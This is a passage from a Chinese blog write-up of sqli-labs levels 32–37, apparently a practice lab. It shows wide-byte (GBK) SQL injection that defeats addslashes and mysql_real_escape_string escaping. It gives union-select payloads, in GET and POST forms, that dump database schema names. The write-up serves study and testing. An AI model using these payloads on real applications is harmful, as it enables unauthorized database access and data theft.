<figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = addslashes(<span class="hljs-string">&apos;Shanghai is the &quot;biggest&quot; city in China.&apos;</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>&#x8F93;&#x51FA;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">Shanghai is the \&quot;biggest\&quot; city in China.<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5185;&#x90E8;&#x5B9E;&#x73B0;&#x5C31;&#x662F;</p>
<figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&apos;/&apos;</span>. preg_quote(<span class="hljs-string">&apos;\\&apos;</span>) .<span class="hljs-string">&apos;/&apos;</span>, <span class="hljs-string">&quot;\\\\\\&quot;</span>, <span class="hljs-variable">$string</span>);          <span class="hljs-comment">//escape any backslash</span><br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&apos;/\&apos;/i&apos;</span>, <span class="hljs-string">&apos;\\\&apos;&apos;</span>, <span class="hljs-variable">$string</span>);                               <span class="hljs-comment">//escape single quote with a backslash</span><br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-string">&apos;/\&quot;/&apos;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>, <span class="hljs-variable">$string</span>);                                <span class="hljs-comment">//escape double quote with a backslash</span><br></code></pre></td></tr></tbody></table></figure>
<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8F93;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">http://127.0.0.1/Less-32/?id=1%df&apos;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6839;&#x636E;&#x4EE5;&#x4E0A;&#x5206;&#x6790;&#xFF0C;&#x53D1;&#x751F;&#x5982;&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;(%5c&#x662F;<code>\</code>&#x7684;&#x5341;&#x516D;&#x8FDB;&#x5236;)</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">%df%27====&gt;(check_addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;&#x904B;&apos;<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&#x904B;&apos;&apos; LIMIT 0,1&quot;; #&#x6210;&#x529F;&#x5C06;&#x5355;&#x5F15;&#x53F7;&#x95ED;&#x5408;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;SQL&#x6CE8;&#x5165;&#x3002;<br></code></pre></td></tr></tbody></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fengshui/p/9266830.html">&#x53C2;&#x8003;1&#xFF1A;https://www.cnblogs.com/fengshui/p/9266830.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html">&#x53C2;&#x8003;2&#xFF1A;https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a><br>&#x65E0;&#x6CD5;&#x6DFB;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x6216;&#x8005;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;16&#x8FDB;&#x5236;&#x7ED5;&#x8FC7;-&#x5F88;&#x9A9A;&#x7684;&#x64CD;&#x4F5C;</p>
<h4><span id="less-32">Less-32</span></h4><p><img src="72.png"><br>&#x8F93;&#x5165;<code>?id=1%df%27</code>&#x9875;&#x9762;&#x4F1A;&#x62A5;&#x9519;&#x8BF4;&#x660E;&#x5355;&#x5F15;&#x7B26;&#x53F7;&#x8D77;&#x4F5C;&#x7528;&#x4E86;&#x3002;c<br><code>?id=-1%df%27%20union%20select%201,2,3%20%23</code>,&#x6709;&#x56DE;&#x663E;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=0%df%27 union select 1,group_concat(schema_name),2 from information_schema.schemata;%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-33">Less-33</span></h4><p>&#x548C;&#x4E0A;&#x540C;&#xFF0C;&#x53EA;&#x662F;&#x628A;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x8F6C;&#x4E49;&#x51FD;&#x6570;&#x6539;&#x6210;&#x5185;&#x7F6E;&#x7684;&#x8F6C;&#x4E49;&#x51FD;&#x6570;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=0%df%27 union select 1,group_concat(schema_name),2 from information_schema.schemata;%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-34">Less-34</span></h4><p>&#x628A;get&#x6539;&#x6210;post&#x4E86;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x5728;&#x754C;&#x9762;&#x4E0A;&#x8F93;&#x5165;&#xFF0C;&#x56E0;&#x4E3A;%&#x4EC0;&#x4E48;&#x7684;&#x90FD;&#x4F1A;&#x4F1A;&#x6D4F;&#x89C8;&#x5668;&#x8F6C;&#x4E49;&#xFF0C;&#x6240;&#x4EE5;burp&#x76F4;&#x63A5;&#x4FEE;&#x6539;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">admin%df&apos;or 0 union select 1,group_concat(schema_name) from information_schema.schemata%23&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></tbody></table></figure>
<p><img src="73.png"></p>
<h4><span id="less-35">Less-35</span></h4><p>&#x76F4;&#x63A5;&#x6CE8;&#x5165;&#xFF1F;&#x56DE;&#x5230;&#x7B2C;&#x4E00;&#x5173;&#x4E86;233</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0 union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-36">Less-36</span></h4><p>&#x4F7F;&#x7528;&#x4E86;mysql_real_escape_string&#x51FD;&#x6570;&#x8FC7;&#x6EE4;<br>&#x67E5;&#x770B;&#x6587;&#x6863;,&#x4E0B;&#x5217;&#x5B57;&#x7B26;&#x53D7;&#x5F71;&#x54CD;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">\x00<br>\n<br>\r<br>\<br>&apos;<br>&quot;<br>\x1a<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8FD8;&#x662F;&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">0%df%27%20union%20selEct%201,group_concat(schema_name),2%20from%20information_schema.schemata;%23<br>-1%EF%BF%BD%27union%20select%201,user(),3--+<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-37">Less-37</span></h4><p>&#x6539;&#x6210;post</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">uname=0%df%27%20union%20selEct%20group_concat(schema_name),2%20from%20information_schema.schemata;%23&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></tbody></table></figure>
</body></html>
    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="../../../../tags/Sql-Injection/">#Sql-Injection</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="../../../05/05/Wireshark%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/">Wireshark数据包分析实战</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="../../11/PHP%E7%89%B9%E6%80%A7/">php特性</a>
            
        </span>
    </div>
    
</article>




    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2020 ShuYu&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/bkfish">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("en-AU");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="../../../../js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '../../../../content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="../../../../js/insight.js"></script>

    
</body>
</html>